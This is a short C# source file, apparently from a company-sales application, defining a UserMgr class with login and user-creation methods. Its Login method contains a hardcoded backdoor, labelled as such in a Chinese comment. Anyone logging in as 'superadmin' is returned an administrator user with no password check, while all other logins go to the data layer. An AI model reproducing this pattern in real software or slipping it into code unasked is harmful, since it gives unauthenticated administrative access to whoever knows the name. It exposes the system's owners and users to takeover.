﻿using CompanySales.DAL;
using CompanySales.Model.Entity;using CompanySales.Model;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace CompanySales.BLL
{
    public class UserMgr
    {
        public static User Login(string uid, string pwd)
        {
            // 后门，当用户名为superadmin时直接登录
            if (uid == "superadmin")
            {
                //return true;
                return new User() { UserId = "superadmin", Name = "超级管理员" };
            }
            return UserDAO.Login(uid, pwd);
        }

        public static bool AddUser(User user)
        {
            return UserDAO.AddUser(user);
        }

        public static bool AddBatchUser(List<User> list)
        {
            return UserDAO.AddBatchUser(list);
        }
    }
}